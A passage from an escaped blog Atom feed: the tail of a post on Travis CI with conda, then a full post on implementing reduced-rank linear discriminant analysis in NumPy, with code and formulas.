  - sudo apt-get update
  &lt;span class="c1"&gt;# We do this conditionally because it saves us some downloading if the&lt;/span&gt;
  &lt;span class="c1"&gt;# version is the same.&lt;/span&gt;
  - &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$TRAVIS_PYTHON_VERSION&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2.7&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
      wget https://repo.continuum.io/miniconda/Miniconda-latest-Linux-x86_64.sh -O miniconda.sh&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
      wget https://repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh -O miniconda.sh&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;
  - bash miniconda.sh -b -p &lt;span class="nv"&gt;$HOME&lt;/span&gt;/miniconda
  - &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HOME&lt;/span&gt;&lt;span class="s2"&gt;/miniconda/bin:&lt;/span&gt;&lt;span class="nv"&gt;$PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
  - &lt;span class="nb"&gt;hash&lt;/span&gt; -r
  - conda config --set always_yes yes --set changeps1 no
  - conda update -q conda
  &lt;span class="c1"&gt;# Useful for debugging any issues with conda&lt;/span&gt;
  - conda info -a

  - conda create -q -n test-environment &lt;span class="nv"&gt;python&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$TRAVIS_PYTHON_VERSION&lt;/span&gt; pandas numpy scipy scikit-learn
  - &lt;span class="nb"&gt;source&lt;/span&gt; activate test-environment
  - python setup.py install
  - pip install pytest

script:
  - py.test


notifications:
  email:
    on_success: never
    on_failure: always
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
Note that you should install pytest manually instead use pre-install one.&lt;/p&gt;
&lt;p&gt;However, you can not use tox with conda direct, try ctox &lt;a href="https://github.com/hayd/ctox"&gt;https://github.com/hayd/ctox&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;2016-03-31 16:19:38&lt;/p&gt;</summary><category term="python"></category><category term="numpy"></category><category term="小结"></category></entry><entry><title>How to Write Reduced Rank Linear Discriminant Analysis with Python</title><link href="http://littlezz.github.io/how-to-write-reduced-rank-linear-discriminant-analysis-with-python.html" rel="alternate"></link><updated>2016-03-26T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-26:how-to-write-reduced-rank-linear-discriminant-analysis-with-python.html</id><summary type="html">&lt;h2 id="intro"&gt;&lt;a name="user-content-intro" href="#intro" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Intro&lt;/h2&gt;
&lt;p&gt;I'm working on a project named &lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESL-Model&lt;/a&gt; which I want to use python to implent algorithm from The Elements of Statistical Learning. I start writing RRLDA the day before yesterday,  and I sccuessfully finish until today.  &lt;/p&gt;
&lt;p&gt;Notice that I am using Python3.5, which allow me use &lt;code&gt;@&lt;/code&gt; instead of &lt;code&gt;np.dot&lt;/code&gt;  &lt;/p&gt;
&lt;h2 id="the-difference-between-numpy-and-r"&gt;&lt;a name="user-content-the-difference-between-numpy-and-r" href="#the-difference-between-numpy-and-r" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;The difference between Numpy and R&lt;/h2&gt;
&lt;p&gt;Firstly, Numpy is slight different with R in eigen decomposition(I spent lots of time to find out T_T).  &lt;/p&gt;
&lt;p&gt;In R, the eigenvalues return from &lt;code&gt;eigen&lt;/code&gt; is descending, which is all notes assume.&lt;br /&gt;
But Numpy &lt;code&gt;np.linalg.eigh&lt;/code&gt; return eigenvalues in ascending order.  &lt;/p&gt;
&lt;p&gt;It is doesn't matter when you work on LDA, because it use both &lt;span class="math"&gt;\(V\)&lt;/span&gt; and &lt;span class="math"&gt;\(D\)&lt;/span&gt;, but it influence the result in Reduced rank LDA which you use column of &lt;span class="math"&gt;\(V\)&lt;/span&gt; alone.  &lt;/p&gt;
&lt;p&gt;To slove this problem, you may use &lt;code&gt;np.fliplr&lt;/code&gt;.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;([[&lt;/span&gt; &lt;span class="mf"&gt;0.9967&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="mf"&gt;0.002&lt;/span&gt; &lt;span class="p"&gt;],&lt;/span&gt;
       &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="mf"&gt;0.002&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="mf"&gt;1.0263&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;

&lt;span class="n"&gt;Dw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Uw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;linalg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eigh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;Dw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Dw&lt;/span&gt;&lt;span class="p"&gt;[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;Uw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fliplr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Uw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can get &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;print(Dw)
[ 1.02643452  0.99656548]


print(Dw)
[[ 0.06711024 -0.99774557]
 [ 0.99774557  0.06711024]]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id="how-to-write-reduced-rank-lda"&gt;&lt;a name="user-content-how-to-write-reduced-rank-lda" href="#how-to-write-reduced-rank-lda" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;How to Write Reduced Rank LDA&lt;/h2&gt;
&lt;p&gt;Finally, we arrive at the algorithm.&lt;br /&gt;
I mainly reference &lt;a href="http://sites.stat.psu.edu/~jiali/course/stat597e/notes2/lda2.pdf"&gt;http://sites.stat.psu.edu/~jiali/course/stat597e/notes2/lda2.pdf&lt;/a&gt;. &lt;br /&gt;
Which is a very very nice ppt, thanks it very much!  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Find the centroids for all the classes and class prior probabilities, which is the same in LDA (&lt;span class="math"&gt;\(\mu_k\)&lt;/span&gt; and &lt;span class="math"&gt;\(\pi_k\)&lt;/span&gt;).  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find between-class covariance matrix B using the centroid vectors and class prior probabilities&lt;br /&gt;
    suppose &lt;span class="math"&gt;\(\mu_k\)&lt;/span&gt; is column vector&lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(\mu = \Sigma_1^K \mu_k\)&lt;/span&gt;&lt;br /&gt;
&lt;span class="math"&gt;\(B =  \Sigma_1^K \pi_k(\mu - \mu_k)(\mu - \mu_k)^T\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Notice that the code dosen't take same shape with formula&lt;/strong&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Sigma_hat&lt;/span&gt;
&lt;span class="c1"&gt;# prior probabilities (K,1)&lt;/span&gt;
&lt;span class="n"&gt;Pi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Pi&lt;/span&gt;
&lt;span class="c1"&gt;# class centroids (K, p)&lt;/span&gt;
&lt;span class="n"&gt;Mu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mu&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;
&lt;span class="c1"&gt;# the number of class&lt;/span&gt;
&lt;span class="n"&gt;K&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;
&lt;span class="c1"&gt;# the dimension you want&lt;/span&gt;
&lt;span class="n"&gt;L&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;

&lt;span class="c1"&gt;# Mu is (K,p) matrix, Pi is (K,1)&lt;/span&gt;
&lt;span class="n"&gt;mu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Pi&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;Mu&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;# vector @ vector equal scalar, use vector[:, None] to transform to matrix&lt;/span&gt;
    &lt;span class="c1"&gt;# vec[:, None] equal to vec.reshape((1, vec.shape[0]))&lt;/span&gt;
    &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;Pi&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Mu&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;mu&lt;/span&gt;&lt;span class="p"&gt;)[:,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Mu&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;mu&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:]))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find within-class covariance matrix W, the same with &lt;span class="math"&gt;\(\hat \Sigma\)&lt;/span&gt; in LDA.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;eigen decomposition W&lt;/p&gt;
&lt;p&gt;&lt;span class="math"&gt;\(W = V_WD_WV_W^T\)&lt;/span&gt;&lt;br /&gt;
Define &lt;span class="math"&gt;\(W^{1/2} = D_W^{1/2}V_W^T\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;So &lt;span class="math"&gt;\(W^{-\frac{1}{2}} = (W^{1/2})^{-1}\)&lt;/span&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Be careful, the `eigh` method get the eigenvalues in ascending , which is opposite to R.&lt;/span&gt;
&lt;span class="n"&gt;Dw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Uw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LA&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eigh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# reverse the Dw_ and Uw&lt;/span&gt;
&lt;span class="n"&gt;Dw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Dw&lt;/span&gt;&lt;span class="p"&gt;[::&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;Uw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fliplr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Uw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;W_half&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;linalg&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pinv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;diagflat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Dw&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;Uw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;compute &lt;span class="math"&gt;\(B^*\)&lt;/span&gt;&lt;br /&gt;
&lt;span class="math"&gt;\(B^* = (W^{-\frac{1}{2}})^TBW^{-\frac{1}{2}}\)&lt;/span&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;B_star&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;W_half&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;W_half&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;eigen decompostion &lt;span class="math"&gt;\(B^*\)&lt;/span&gt;, get &lt;span class="math"&gt;\(a_l\)&lt;/span&gt;&lt;br /&gt;
&lt;span class="math"&gt;\(B^* = VDV^T\)&lt;/span&gt;&lt;br /&gt;
&lt;span class="math"&gt;\(a_l = W^{-\frac{1}{2}}V_l\)&lt;/span&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;D_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;V&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LA&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eigh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;B_star&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# reverse V&lt;/span&gt;
&lt;span class="n"&gt;V&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fliplr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;V&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;:]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;W_half&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;V&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;transform X and &lt;span class="math"&gt;\(\mu_k\)&lt;/span&gt; and get predict value&lt;br /&gt;
&lt;span class="math"&gt;\(\hat x = Ax\)&lt;/span&gt;&lt;br /&gt;
&lt;span class="math"&gt;\(\hat \mu_k = A\mu_k\)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;find &lt;span class="math"&gt;\(argmin_k {|\hat x- \hat\mu|_2^2 - log(\pi_k)}\)&lt;/span&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;X_star&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;X&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;K&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;# mu_s_star shape is (p,)&lt;/span&gt;
    &lt;span class="n"&gt;mu_k_star&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mu&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="c1"&gt;# Ref: http://docs.scipy.org/doc/numpy/reference/generated/numpy.linalg.norm.html&lt;/span&gt;
    &lt;span class="c1"&gt;# Ref: http://stackoverflow.com/questions/1401712/how-can-the-euclidean-distance-be-calculated-with-numpy&lt;/span&gt;
    &lt;span class="n"&gt;Y&lt;/span&gt;&lt;span class="p"&gt;[:,&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LA&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;norm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;X_star&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;mu_k_star&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Pi&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="c1"&gt;# Python index start from 0, transform to start with 1&lt;/span&gt;
&lt;span class="n"&gt;y_hat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Y&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argmin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reshape&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="put-it-together"&gt;&lt;a name="user-content-put-it-together" href="#put-it-together" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Put it Together&lt;/h2&gt;
&lt;p&gt;You can find complete code in here&lt;br /&gt;
&lt;a href="https://github.com/littlezz/ESL-Model/blob/master/esl_model/ch4/model.py"&gt;https://github.com/littlezz/ESL-Model/blob/master/esl_model/ch4/model.py&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="reference"&gt;&lt;a name="user-content-reference" href="#reference" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The Elements of Statistical Learning 2nd Edition section 4.3.2 - 4.3.3  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://sites.stat.psu.edu/~jiali/course/stat597e/notes2/lda2.pdf"&gt;http://sites.stat.psu.edu/~jiali/course/stat597e/notes2/lda2.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://onlinecourses.science.psu.edu/stat857/node/83"&gt;https://onlinecourses.science.psu.edu/stat857/node/83&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.stat.cmu.edu/~ryantibs/datamining/lectures/21-clas2-marked.pdf"&gt;http://www.stat.cmu.edu/~ryantibs/datamining/lectures/21-clas2-marked.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2016-03-26 15:43:45&lt;/p&gt;
&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
    var align = "left",
        indent = "0em",
        linebreak = "false";

    if (true) {
        align = (screen.width &lt; 768) ? "left" : align;
        indent = (screen.width &lt; 768) ? "0em" : indent;
        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
    }

    var mathjaxscript = document.createElement('script');
    var location_protocol = (false) ? 'https' : document.location.protocol;
    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
    mathjaxscript.type = 'text/javascript';
    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
        "MathJax.Hub.Config({" +
        "    config: ['MMLorHTML.js']," +
        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } }," +
        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
        "    displayAlign: '"+ align +"'," +
        "    displayIndent: '"+ indent +"'," +
        "    showMathMenu: true," +
        "    messageStyle: 'normal'," +
        "    tex2jax: { " +
        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
        "        displayMath: [ ['$$','$$'] ]," +
        "        processEscapes: true," +
        "        preview: 'TeX'," +
        "    }, " +
        "    'HTML-CSS': { " +
        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
        "    }, " +
        "}); " +
        "if ('default' !== 'default') {" +
            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
